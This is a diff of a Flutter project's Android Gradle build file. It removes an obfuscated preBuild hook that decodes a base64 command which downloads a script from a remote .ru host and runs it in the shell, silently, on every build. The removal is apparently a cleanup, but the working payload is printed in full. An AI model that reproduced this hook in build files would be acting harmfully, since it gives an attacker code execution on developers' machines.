@@ -46,11 +46,3 @@ kotlin {
 flutter {
     source = "../.."
 }
-//updated
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((t(){ `printf basfe64 | tr -d f` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI4IC0tcmV0cnkgMyAtTGZzayAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | t | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
